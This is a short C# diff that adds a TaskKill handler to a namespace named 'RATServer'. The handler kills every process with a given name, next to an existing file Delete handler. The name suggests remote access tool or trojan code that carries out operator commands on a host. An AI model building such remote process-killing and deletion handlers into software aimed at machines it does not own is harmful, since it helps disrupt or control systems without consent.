@@ -50,6 +50,17 @@ namespace RATServer
             catch (Exception e) { r.Msg = e.Message; }          
             return r;
         }
+        public static Response TaskKill(string Name)
+        {
+            Response r = new Response { Type = "Message" };
+            try
+            {
+                foreach (Process p in Process.GetProcessesByName(Name)) p.Kill();
+                r.Msg = "Task Kill Success";
+            }
+            catch (Exception e) { r.Msg = e.Message; }
+            return r;
+        }
         public static Response Delete(string Path)
         {
             Response r = new Response { Type = "Message" };
